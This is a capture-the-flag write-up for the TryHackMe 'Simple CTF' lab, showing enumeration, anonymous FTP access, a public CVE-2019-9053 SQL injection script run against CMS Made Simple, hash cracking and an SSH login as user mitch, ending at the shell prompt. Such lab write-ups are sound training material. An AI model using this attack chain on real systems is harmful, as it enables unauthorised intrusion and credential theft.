#	Simple CTF -Tryhackme
1.  IP:    10.10.113.213
2.  Date:   18/06/2023
3.  Author: Shaswata Saha
4.  Time:   12:00 GMT+5:30


1.  GoBuster Scan:

```bash

┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.113.213 -w Documents/gobuster-wordlist/dsstorewordlist.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.113.213
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/18 02:38:57 Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 929]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.htpasswds           (Status: 403) [Size: 298]
Progress: 1825 / 1829 (99.78%)
===============================================================
2023/06/18 02:39:45 Finished
===============================================================
                                                                

```

2.  Logging to ftp Anonymous since it is a vulnerability from nmap scan"

```bash
┌──(subhro1530㉿subhro)-[~]
└─$ ftp 10.10.113.213
Connected to 10.10.113.213.
220 (vsFTPd 3.0.3)
Name (10.10.113.213:subhro1530): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48024|)
ftp: Can't connect to `10.10.113.213:48024': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> cat ForMitch.txt
?Invalid command.
ftp> nano ForMitch.txt
?Invalid command.
ftp> ls -al
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |************************************************|   166      602.63 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (0.66 KiB/s)
ftp> exit
221 Goodbye.

```

3. Exploring new file:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/SimpleCTF]
└─$ cat ForMitch.txt              
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
From this we assume we can brute force it easily.

4.  Searching CMS for Q3:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ searchsploit cms made simple 2.2
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection       | php/webapps/4810.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authentica | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Uplo | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting ( | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)               | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via S | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execut | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execut | php/webapps/45793.py
CMS Made Simple < 2.2.10 - SQL Injection                   | php/webapps/46635.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```
Now searching in [Exploit Database](https://www.exploit-db.com/exploits/46635) we found 2.2.10 CVE:
### 2019-9053

>   CVE-2019-9053

5.  We copied the python file to our folder using searchsploit:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/SimpleCTF]
└─$ searchsploit -m php/webapps/46635.py
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable

Copied to: /home/subhro1530/Desktop/tryhackme/SimpleCTF/46635.py

```

6.  Run the python script as
```bash
python3 46635.py -u http://10.10.113.213/simple

```

Output:
```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.como5ds
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

7. Retrieving the hash:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 0c01f4468bd75d7a84c7eb73846e8d96

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------

```

8.  Decoding the MD5 and salt from [Decoder](https://www.dcode.fr/md5-hash)
>   1dac0d92e9fa6bb2secret
Therefore pass : secret

9.  Establishing ssh connection:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/SimpleCTF]
└─$ ssh mitch@10.10.113.213 -p 2222
The authenticity of host '[10.10.113.213]:2222 ([10.10.113.213]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[10.10.113.213]:2222' (ED25519) to the list of known hosts.
mitch@10.10.113.213's password: 
Permission denied, please try again.
mitch@10.10.113.213's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 

```